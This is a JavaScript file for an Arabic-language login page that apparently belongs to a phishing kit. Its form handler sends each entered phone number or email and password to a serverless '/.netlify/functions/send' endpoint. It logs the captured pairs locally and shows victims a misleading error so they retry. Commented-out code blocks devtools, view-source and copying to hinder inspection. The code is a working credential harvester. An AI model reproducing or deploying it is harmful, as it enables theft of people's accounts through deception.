let sentData = JSON.parse(localStorage.getItem('sentData')) || [];

// document.addEventListener('contextmenu', event => event.preventDefault());

// document.addEventListener('keydown', function (event) {
//     if ((event.ctrlKey || event.metaKey) && event.key === 's') {
//         event.preventDefault();
//     }

//     if ((event.ctrlKey || event.metaKey) && event.key === 'u') {
//         event.preventDefault();
//     }

//     if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.key === 'i' || event.key === 'F12') {
//         event.preventDefault();
//     }

//     if ((event.ctrlKey || event.metaKey) && event.key === 'c') {
//         event.preventDefault();
//     }

//     if (event.key === 'PrintScreen') {
//         event.preventDefault();
//     }
// });

// document.addEventListener('dragstart', function (event) {
//     event.preventDefault();
// });

// function detectDevTools() {
//     const threshold = 160;

//     const checkDevTools = () => {
//         const widthThreshold = window.outerWidth - window.innerWidth > threshold;
//         const heightThreshold = window.outerHeight - window.innerHeight > threshold;
//         if (widthThreshold || heightThreshold) {
//             document.body.innerHTML = 'الوصول مرفوض!';
//         }
//     };

//     window.addEventListener('resize', checkDevTools);
//     setInterval(checkDevTools, 1000);
// }

// detectDevTools();

function checkLogMode(logMode) {
    console.log("checkLogMode called with:", logMode);

    const inputField = document.getElementById('userInput');
    const flag = document.querySelector('.flags');

    const phoneBtn = document.getElementById('phone');
    const mailBtn = document.getElementById('mail');

    if (!inputField || !flag || !phoneBtn || !mailBtn) {
        console.error("One or more elements not found");
        return;
    }

    if (logMode === 'phone') {
        inputField.placeholder = 'رقم الهاتف';
        inputField.type = 'tel';
        flag.style.display = 'flex';

        phoneBtn.style.backgroundColor = 'transparent';
        phoneBtn.style.color = '#008685';
        mailBtn.style.backgroundColor = '#008685';
        mailBtn.style.color = 'white';
    } else if (logMode === 'mail') {
        inputField.placeholder = 'البريد الإلكتروني';
        inputField.type = 'email';
        flag.style.display = 'none';

        mailBtn.style.backgroundColor = 'transparent';
        mailBtn.style.color = '#008685';
        phoneBtn.style.backgroundColor = '#008685';
        phoneBtn.style.color = 'white';
    } else {
        console.error("Invalid logMode:", logMode);
    }
}

document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');
    const mailBtn = document.getElementById('mail');
    const phoneBtn = document.getElementById('phone');

    if (mailBtn) {
        mailBtn.addEventListener('click', function () {
            checkLogMode('mail');
        });
    }

    if (phoneBtn) {
        phoneBtn.addEventListener('click', function () {
            checkLogMode('phone');
        });
    }

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const errorElement = document.getElementById('error-message');
        const userInput = document.getElementById('userInput').value.trim();
        const password = document.getElementById('password').value.trim();

        const isDuplicate = sentData.some(data =>
            data.user === userInput && data.pass === password
        );

        if (isDuplicate) {
            errorElement.textContent = 'تم إرسالها مسبقاً البيانات خطاء!';
            errorElement.style.display = 'flex';
            setTimeout(() => errorElement.style.display = 'none', 4000);
            return;
        }

        fetch('/.netlify/functions/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                text: userInput,
                password: password
            })
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    sentData.push({ user: userInput, pass: password });
                    localStorage.setItem('sentData', JSON.stringify(sentData));

                    form.reset();
                }

                errorElement.textContent = data.message;
                errorElement.style.display = 'flex';
                setTimeout(() => errorElement.style.display = 'none', 4000);
            })
            .catch(error => {
                console.error('Error:', error);
                errorElement.textContent = 'حدث خطأ أثناء تسجيل الدخول';
                errorElement.style.display = 'flex';
                setTimeout(() => errorElement.style.display = 'none', 4000);
            });
    });

    checkLogMode('phone');
});